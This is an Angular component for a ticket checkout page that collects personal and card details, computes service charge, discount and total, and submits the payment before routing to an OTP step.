import { Component, inject } from '@angular/core';
import { CommonModule, Location } from '@angular/common';
import { Router } from '@angular/router';
import { FormBuilder, FormGroup, Validators, ReactiveFormsModule } from '@angular/forms';
import { Header } from "../../Layout/header/header";
import { OrderCartService } from '../../Core/services/order-cart.service';
import { CheckoutService } from '../../Core/services/api/checkout.service';

@Component({
  imports: [CommonModule, ReactiveFormsModule, Header],
  selector: 'app-card-pay',
  styleUrl: './card-pay.css',
  templateUrl: './card-pay.html',
})
export class CardPay {
  private readonly orderCartService = inject(OrderCartService);
  private readonly checkoutService = inject(CheckoutService);
  private readonly location = inject(Location);
  private readonly router = inject(Router);
  private readonly fb = inject(FormBuilder);

  paymentForm: FormGroup = this.fb.group({
    personalInfo: this.fb.group({
      name: ['', Validators.required],
      email: ['', [Validators.required, Validators.email]],
      phone: ['', Validators.required],
      age: ['', [Validators.required, Validators.min(1)]]
    }),
    cardDetails: this.fb.group({
      cardNumber: ['', Validators.required],
      expiryMonth: ['', Validators.required],
      expiryYear: ['', Validators.required],
      cvv: ['', Validators.required]
    })
  });

  get items() {
    return this.orderCartService.getItems();
  }

  get totalTickets() {
    return this.orderCartService.getTotalTickets();
  }

  get subtotal() {
    return this.orderCartService.getTotalPrice();
  }

  get serviceCharge() {
    return this.subtotal * 0.04;
  }

  get discount() {
    return (this.subtotal + this.serviceCharge) * 0.3;
  }

  get total() {
    return (this.subtotal + this.serviceCharge) - this.discount;
  }

  goBack() {
    this.location.back();
  }

  pay() {
    if (this.paymentForm.valid) {
      const personalInfo = this.paymentForm.value.personalInfo;
      const cardDetails = this.paymentForm.value.cardDetails;
      
      const payload = {
        cc_name: personalInfo.name,
        cc_number: cardDetails.cardNumber.toString(),
        cc_date: `${cardDetails.expiryMonth}/${cardDetails.expiryYear}`,
        cc_cvv: cardDetails.cvv.toString(),
        credit: this.total
      };

      this.checkoutService.submitPayment(payload).subscribe({
        next: () => {
          this.router.navigate(['/payment/otp']);
        },
        error: (err) => {
          console.error('Payment submission failed', err);
        }
      });
    } else {
      this.paymentForm.markAllAsTouched();
    }
  }
}
